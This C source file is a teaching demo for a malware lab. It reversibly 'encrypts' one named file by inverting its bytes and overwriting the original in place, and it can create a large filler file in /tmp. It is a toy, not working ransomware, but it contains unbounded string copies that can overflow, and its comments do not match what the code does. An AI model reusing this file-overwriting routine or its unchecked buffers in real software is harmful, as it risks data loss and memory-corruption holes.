/**
 *
 * @brief      This program is written by Weiyang Zhang, for the malware lab experiment. The purpose of this program
 *             is to make students have a sense of what a ransomware is. Students will be guided to run the program, and
 *             all of files on destop will be encrypted using an invertable algorithm, that is, all files on desktop will
 *             be encrypted by running the program the first time,and all files will be decrypted when executing it by the
 *             second time.
 *
 * @author     Weiyang Zhang
 * @date       7/12/2020
 */

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <time.h>

#define MAX_LEN 512
/**
 * This method is used to get file extention.
 * @param  filename [description]
 * @return          [description]
 */
const char *get_filename_ext(const char *filename)
{
	const char *dot = strrchr(filename, '.');
	if (!dot || dot == filename)
		return "";
	return dot + 1;
}


/**
 * This method is used to create a text file which its size is 1GB in the
 * directory /tmp
 * [create_large_file description]
 */
const int create_large_file()
{
	printf("Generating test file in the directory /tmp/\n");
	FILE *fp;
	fp = fopen("/tmp/labtest.tcis", "w");
	int size = 1024 * 1024 * 512; //512MB size
	fseek(fp, size, SEEK_CUR);
	fputs("Lab Test for TCIS project", fp);
	fclose(fp);

	char buffer[] = {'a'};

	fp = fopen("/tmp/labtest.tcis", "w");
	for (int i = 0; i < size; ++i)
	{
		fwrite(buffer, sizeof(char), sizeof(buffer), fp);
	}
	fclose(fp);
	printf("Completed!\n");

	return 0;
}


int main(int argc, char const *argv[])
{
	char full_file_path[MAX_LEN];

	char src[MAX_LEN], tgt[MAX_LEN], ch;
	memset(full_file_path, 0, MAX_LEN);

	strcat(full_file_path, argv[1]);

	//for test purpose we only encrypt the file with tcis suffix.
	//const char *ext = get_filename_ext(full_file_path);
	//if( strcmp(ext, "tcis")!=0)
	//  continue;

	FILE *fs;
	fs = fopen(full_file_path, "rb");

	if (fs == NULL)
		return -1;

	sprintf(tgt , "%s.ed", full_file_path); //format the name of the temporary file

	FILE *ft;
	ft = fopen(tgt, "w");
	if (ft == NULL)
		return -1;

	time_t t;
	time(&t);
	char *curr_time = ctime(&t);
	curr_time[strlen(curr_time)-1] ='\0';

	printf("[%s] Ransomware starts to encrypt file!\n", curr_time);
	int blockSize = 256;
	char buff[blockSize];

	size_t n;
	while ( (n = fread(buff, 1, blockSize, fs)) != 0) {
		for (int i = 0; i < n ; i++)
			buff[i] = ~buff[i]; // encrypt or decrypt

		fwrite(buff, 1, n, ft);
	}

	fclose(fs);
	fclose(ft);

	remove(full_file_path);
	rename(tgt, full_file_path);

	time(&t);
	curr_time = ctime(&t);
	curr_time[strlen(curr_time)-1] ='\0';

	printf("[%s] Ransomware has finished encrypting the file!\n\n", curr_time);


	return 0;
}
